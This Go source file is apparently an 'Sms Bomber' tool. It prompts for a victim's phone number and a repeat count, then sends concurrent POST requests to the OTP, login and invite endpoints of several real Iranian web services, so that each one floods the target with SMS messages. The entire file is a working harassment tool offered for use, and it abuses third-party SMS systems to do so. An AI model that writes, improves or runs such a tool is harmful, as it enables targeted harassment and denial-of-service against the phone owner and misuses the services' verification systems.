package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv" // Import strconv for string to integer conversion
	"strings"
	"sync"
)

// clearScreen clears the terminal screen based on the operating system.
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// sendJSONRequest sends an HTTP POST request with a JSON payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report only the HTTP status code.
func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	// wg.Done() should be deferred here to ensure it's called even if errors occur
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		// Use error color for encoding errors
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		// Use error color for request creation errors
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// Check if the error is due to context cancellation
		if ctx.Err() == context.Canceled {
			// Use a distinct color/message for cancellation
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // Report a specific code for cancellation (or handle differently if needed)
			return
		}
		// Use error color for other request errors
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError // Report a standard error status code for other errors
		return
	}
	defer resp.Body.Close()

	// Report only the HTTP status code
	ch <- resp.StatusCode
}

// sendFormRequest sends an HTTP POST request with a form-urlencoded payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report only the HTTP status code.
func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	// wg.Done() should be deferred here to ensure it's called even if errors occur
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		// Use error color for request creation errors
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// Check if the error is due to context cancellation
		if ctx.Err() == context.Canceled {
			// Use a distinct color/message for cancellation
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // Report a specific code for cancellation (or handle differently if needed)
			return
		}
		// Use error color for other request errors
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError // Report a standard error status code for other errors
		return
	}
	defer resp.Body.Close()

	// Report only the HTTP status code
	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	// --- ASCII Banner with Colors ---
	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color
	// --- End of ASCII Banner ---

	// Service introduction messages and input prompts (like smstest.go)
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// Setup context for cancellation and signal handling for graceful shutdown (Ctrl+C)
	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		// Use error-like color for interrupt message
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() // Cancel the context
	}()

	var wg sync.WaitGroup
	// Create a buffered channel to receive integer status codes.
	// Buffer size based on the number of new APIs (8 APIs * repeatCount).
	ch := make(chan int, repeatCount*10) // Adjusted buffer size

	// Convert phone string to integer for specific APIs if needed
	// Perform conversion once before the loop
	phoneInt, err := strconv.Atoi(strings.TrimPrefix(phone, "0")) // Remove leading 0 and convert
	if err != nil {
		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Skipping APIs that require integer format.\033[0m")
		// err is now set, and phoneInt might be 0 or another default value.
		// The check `if conversionErr == nil` inside the goroutine will handle this.
	}


	// Loop to send requests concurrently
	for i := 0; i < repeatCount; i++ {
		// sandbox.sibirani.ir invite (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// sandbox.sibirani.com generator-inv-token (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)		
// tap33.me v2/user (JSON - adjusted payload format)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)

		wg.Add(1) 
		go func(pInt int, conversionErr error) { 
			defer wg.Done() 
			if conversionErr == nil {
				
				payload := map[string]interface{}{
					"mobile": pInt, 
				}
				jsonData, marshalErr := json.Marshal(payload)
				if marshalErr != nil {
					fmt.Println("\033[01;31m[-] Error while encoding JSON for api.nobat.ir!\033[0m")
					ch <- http.StatusInternalServerError
					return
				}

				req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, "https://api.nobat.ir/patient/login/phone", bytes.NewBuffer(jsonData))
				if reqErr != nil {
					fmt.Println("\033[01;31m[-] Error while creating request to api.nobat.ir!\033[0m", reqErr)
					ch <- http.StatusInternalServerError
					return
				}
				req.Header.Set("Content-Type", "application/json")

				resp, clientErr := http.DefaultClient.Do(req)
				if clientErr != nil {
					if ctx.Err() == context.Canceled {
						fmt.Println("\033[01;33m[!] Request to api.nobat.ir canceled.\033[0m")
						ch <- 0
						return
					}
					fmt.Println("\033[01;31m[-] Error while sending request to api.nobat.ir!", clientErr)
					ch <- http.StatusInternalServerError
					return
				}
				defer resp.Body.Close()
				ch <- resp.StatusCode

			} else {
				
				ch <- http.StatusInternalServerError
			
			}
		}(phoneInt, err) 


		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		// api.sibbank.ir (JSON) - Corrected payload (assuming key is "phone_number")
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		// sandbox.sibirani.com generator-inv-token (JSON) - Corrected payload (using input phone)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

	}

	// Goroutine to wait for all requests to complete and then close the channel.
	go func() {
		wg.Wait() // Wait for all Goroutines in the WaitGroup to finish
		close(ch) // Close the channel when all Goroutines are done
	}()

	// Read integer status codes from the channel until it is closed and print messages
	// similar to smstest.go's output.
	for statusCode := range ch {
		// Added a check for status code 0 which we used for cancellation
		if statusCode >= 400 || statusCode == 0 { // Treat any 4xx or 5xx as an error, plus our cancellation code 0
			fmt.Println("\033[01;31m[-] Error ! ") // Error message format from smstest.go
		} else { // Assume 2xx and 3xx are successful or redirects (treated as success for this purpose)
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended") // Success message format from smstest.go
		}
	}

	// The final "All requests processed." message is still omitted to match smstest.go style.
}
